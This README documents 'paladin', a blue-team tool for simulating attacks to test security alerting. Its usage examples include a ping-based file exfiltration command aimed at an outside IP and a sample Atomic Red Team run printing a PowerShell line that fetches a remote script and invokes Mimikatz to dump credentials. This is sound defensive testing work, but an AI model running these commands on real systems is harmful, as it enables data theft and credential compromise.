<p align="center"> 
  <img src="images/logo.png" width="250" title="paladin" align="center">
  <p align="center">A blueteam tool to simulate attacks using Atomic Red Team and other techniques.</p>
</p>

---

## Getting started

### Ping Exfil

The ping exfil subcommand is working and implements a basic ping exfil attack scenario.
```
Run ping exfil like tests on current host

Usage:
  paladin exfil ping [flags]
  paladin exfil ping [command]

Available Commands:
  receive     Packet capture ping requests and reassemble files

Flags:
  -d, --destination string   The Destination Host of the Ping
  -f, --file string          The name of the file to send over ping
  -h, --help                 help for ping

Use "paladin exfil ping [command] --help" for more information about a command.
```
#### Basic Usage
Client

```console
$ paladin exfil ping -d 45.63.67.242 -f test.txt
```

Server
```console
$ paladin exfil ping receive -i ens3
```
### Atomic Red Team
The atomic red team repo is pulled then stored into a statik fs within the binary. Some tests are not working since this is still WIP.

```
Run Atomic red team attacks to test security alerting
tests can be found here https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/index.md

Usage:
  paladin art [flags]

Flags:
  -a, --atomic string   Atomic technique to run..ie T1003
  -h, --help            help for art
```
#### Basic Usage
```console
$ bin/paladin art -a T1003
INFO[0000] Running atomic attack T1003
INFO[0000] Opening /T1003/T1003.yaml
INFO[0000] Would You Like to Run This Attack?
Powershell Mimikatz
IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds

Use the arrow keys to navigate: ↓ ↑ → ←
? Select[Yes/No]:
  ▸ Yes
    No
```

### DNS Exfil
WIP

### Infection Gopher
WIP

## Local Development

This project requires Go to be installed. On OS X with Homebrew you can just run `brew install go`.

Building locally requires statik 

```console
$ go get github.com/rakyll/statik
```

Running it then should be as simple as:

```console
$ make
$ ./bin/paladin
```